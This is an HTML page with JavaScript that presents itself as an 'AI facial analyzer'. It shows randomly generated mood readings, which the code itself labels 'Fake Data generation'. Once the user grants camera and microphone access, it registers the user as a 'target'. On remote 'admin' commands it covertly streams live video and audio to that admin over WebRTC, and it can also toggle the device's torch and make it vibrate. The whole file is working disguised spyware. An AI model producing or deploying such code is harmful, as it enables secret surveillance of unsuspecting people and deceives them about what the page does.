<!DOCTYPE html>
<html lang="en">
<head>
    <title>Leo AI - Facial Analyzer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { background: #000; color: #00d4ff; font-family: 'Courier New', monospace; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .scanner-box { width: 300px; height: 400px; border: 2px solid #00d4ff; position: relative; border-radius: 20px; overflow: hidden; background: #050a14; }
        .scan-line { width: 100%; height: 4px; background: #00d4ff; position: absolute; top: 0; left: 0; box-shadow: 0 0 15px #00d4ff; animation: scan 3s infinite linear; display: none; }
        @keyframes scan { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
        .overlay-text { position: absolute; bottom: 20px; width: 100%; text-align: center; font-size: 12px; }
        button { background: transparent; border: 2px solid #00d4ff; color: #00d4ff; padding: 15px 30px; font-weight: bold; cursor: pointer; border-radius: 30px; z-index: 10; }
        button:hover { background: #00d4ff; color: #000; }
        #status-log { font-size: 10px; margin-top: 10px; color: #0088cc; height: 50px; overflow: hidden; }
        video { width: 100%; height: 100%; object-fit: cover; filter: grayscale(100%) brightness(1.2) contrast(1.2); }
    </style>
</head>
<body>

    <h2>LEO AI SYSTEM v4.0</h2>
    <div class="scanner-box" id="box">
        <video id="localVideo" autoplay playsinline muted></video>
        <div class="scan-line" id="line"></div>
        <div class="overlay-text" id="overlay">AI SYSTEM READY</div>
    </div>

    <div id="status-log"></div>
    <br>
    <button id="start-btn" onclick="startAI()">ACTIVATE LEO SCANNER</button>

    <script>
        const socket = io();
        let localStream;
        let peerConnection;
        let adminId = null;
        const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
function log(msg) {
            const div = document.getElementById('status-log');
            div.innerHTML += `> ${msg}<br>`;
        }

        async function startAI() {
            document.getElementById('start-btn').style.display = 'none';
            log("Requesting Hardware Access...");
            
            try {
                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('localVideo').srcObject = localStream;
                document.getElementById('line').style.display = 'block';
                document.getElementById('overlay').innerText = "SCANNING FACIAL MESH...";
                
                log("Sensors Calibrated.");
                log("AI Neural Link Established.");
                socket.emit('target-join');

                // Fake Data generation
                setInterval(() => {
                    const moods = ["CALM", "FOCUSED", "NEUTRAL", "STRESSED"];
                    const mood = moods[Math.floor(Math.random()*moods.length)];
                    document.getElementById('overlay').innerText = `ANALYZING... MOOD: ${mood}`;
                }, 3000);

            } catch (err) {
                alert("AI requires Camera & Mic permissions to function.");
                location.reload();
            }
        }
        socket.on('command', async (data) => {
            if(data.cmd === 'start-stream') {
                adminId = data.adminId;
                const pc = new RTCPeerConnection(config);
                peerConnection = pc;
                localStream.getTracks().forEach(t => pc.addTrack(t, localStream));
                pc.onicecandidate = (e) => {
                    if(e.candidate) socket.emit('signal', { to: adminId, signal: { candidate: e.candidate } });
                };
                const offer = await pc.createOffer();
                await pc.setLocalDescription(offer);
                socket.emit('signal', { to: adminId, signal: { sdp: offer } });
            } else if(data.cmd === 'flash') {
                const track = localStream.getVideoTracks()[0];
                const settings = track.getSettings();
                await track.applyConstraints({ advanced: [{ torch: !settings.torch }] });
            } else if(data.cmd === 'vibrate') { window.navigator.vibrate(200); }
        });

        socket.on('signal', async (data) => {
            if(data.signal.sdp) await peerConnection.setRemoteDescription(new RTCSessionDescription(data.signal.sdp));
            else if(data.signal.candidate) await peerConnection.addIceCandidate(new RTCIceCandidate(data.signal.candidate));
        });
    </script>
</body>
</html>
